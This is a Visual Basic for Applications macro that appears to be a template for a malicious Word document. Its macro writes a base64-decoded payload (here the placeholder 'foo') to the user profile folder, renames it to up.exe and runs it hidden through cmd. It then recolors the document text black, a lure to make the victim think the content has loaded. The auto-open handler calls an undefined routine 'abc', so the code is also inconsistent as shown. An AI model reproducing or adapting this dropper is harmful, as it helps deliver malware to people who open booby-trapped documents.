Sub main()
    Dim path As String
    path = save2file()
    
    Dim cLine As String
    cLine = "cmd /c cd /d %USERPROFILE% && ren up.txt up.exe && up https://www.google.com/"
    
    Dim n As Long
    n = Shell(cLine, vbHide)
    
    ActiveDocument.Content.Font.ColorIndex = wdBlack
    
End Sub
Function save2file() As String
    Dim path As String
    Dim vbuffer As String
    
    path = Environ("USERPROFILE")
    path = path & "\up.txt"
    
    vbuffer = vbuffer + "foo"


    Dim decoded() As Byte
    decoded = DecodeBase64(vbuffer)
    Open path For Binary As #1
    Put #1, , decoded
    Close #1
    
    save2file = path
End Function
'http://web.archive.org/web/20060527094535/http://www.nonhostile.com/howto-encode-decode-base64-vb6.asp
Private Function DecodeBase64(ByVal strData As String) As Byte()
    Dim objXML
    Dim objNode
    
    Set objXML = CreateObject("Msxml2.DOMDocument.6.0")
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
    
    Set objNode = Nothing
    Set objXML = Nothing
End Function
Sub Document_open()
    abc
End Sub
